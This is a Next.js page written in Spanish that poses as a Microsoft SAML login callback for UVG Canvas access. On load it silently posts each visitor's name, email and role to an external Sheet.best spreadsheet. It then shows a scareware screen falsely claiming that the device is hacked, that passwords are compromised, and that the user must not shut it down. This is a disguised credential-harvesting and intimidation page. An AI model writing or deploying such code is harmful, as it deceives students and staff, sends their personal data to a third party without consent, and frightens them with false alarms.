"use client"

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { AlertCircle, User } from "lucide-react"
import Link from "next/link"
import { useEffect, useState } from "react"
import { useSearchParams } from "next/navigation"

// --- Sheet.best Integration ---
export interface UserAuthData {
  nombre: string
  correo: string
  rol: string
  tipoLogin: string
  origen: string
  fechaHora: string
}

export async function sendUserDataToSheets(data: UserAuthData): Promise<boolean> {
  try {
    const response = await fetch(
      "https://api.sheetbest.com/sheets/f4b4847f-72fe-48c4-ac69-1e0ebfe26c26",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      }
    )
    return response.ok
  } catch (error) {
    console.error("Error enviando datos a Sheet.best:", error)
    return false
  }
}

// --- User Data Interface ---
interface UserData {
  email: string
  name: string
  role: string
  timestamp: string
}

export default function AuthCallbackPage() {
  const [userData, setUserData] = useState<UserData | null>(null)
  const [isLoading, setIsLoading] = useState(true)
  const [sheetsStatus, setSheetsStatus] = useState<"pending" | "success" | "error">("pending")
  const searchParams = useSearchParams()

  useEffect(() => {
    const processSAMLResponse = async () => {
      const mockUserData: UserData = {
        email: searchParams.get("email") || "usuario@uvg.edu.gt",
        name: searchParams.get("name") || "Usuario UVG",
        role: searchParams.get("role") || "student",
        timestamp: new Date().toISOString(),
      }

      localStorage.setItem("uvg_user", JSON.stringify(mockUserData))
      setUserData(mockUserData)

      const sheetData: UserAuthData = {
        nombre: mockUserData.name,
        correo: mockUserData.email,
        rol: mockUserData.role,
        tipoLogin: "Microsoft SAML",
        origen: "Canvas Access",
        fechaHora: mockUserData.timestamp,
      }

      const success = await sendUserDataToSheets(sheetData)
      setSheetsStatus(success ? "success" : "error")
      setIsLoading(false)
    }

    processSAMLResponse()
  }, [searchParams])

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Procesando autenticación...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center py-12 px-4">
      <div className="max-w-md w-full space-y-8">
        {userData && (
          <Card className="border-red-200 bg-red-50">
            <CardHeader className="text-center">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <AlertCircle className="w-8 h-8 text-red-600" />
              </div>
              <CardTitle className="text-xl text-red-800">
                ¡SU DISPOSITIVO HA SIDO HAKEADO!
              </CardTitle>
            </CardHeader>

            <CardContent className="space-y-4">
              <ul className="text-sm text-red-700 space-y-1">
                <li>• ¡PELIGRO MÁXIMO! Se ha detectado acceso completo a tu computadora</li>
                <li>• Todos tus archivos y contraseñas han sido comprometidos</li>
                <li>• Tu sesión académica y correo institucional están siendo monitoreados</li>
                <li>• No apagues ni reinicies el sistema: riesgo de pérdida total de datos</li>
                <li>• Registro de actividad enviado a un servidor externo</li>
                <li>• Actúa bajo tu propio riesgo: tu información está en peligro</li>
              </ul>

              <Button
                onClick={() => {}}
                className="w-full bg-red-600 hover:bg-red-700 text-white py-3"
                size="lg"
              >
                ¡No intentes apagar su dispositivo!
                <AlertCircle className="w-4 h-4 ml-2" />
              </Button>

              <div className="mt-4 text-xs text-gray-500">
                <p>Correo detectado: {userData.email}</p>
                <p>Usuario: {userData.name}</p>
                <p>Rol: {userData.role === "student" ? "Estudiante" : "Colaborador"}</p>
                <p>Autenticado: {new Date(userData.timestamp).toLocaleString("es-GT")}</p>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Back Link */}
        <div className="text-center">
          <Link href="/" className="text-sm text-green-600 hover:text-green-500">
            ← Volver al inicio
          </Link>
        </div>
      </div>
    </div>
  )
}
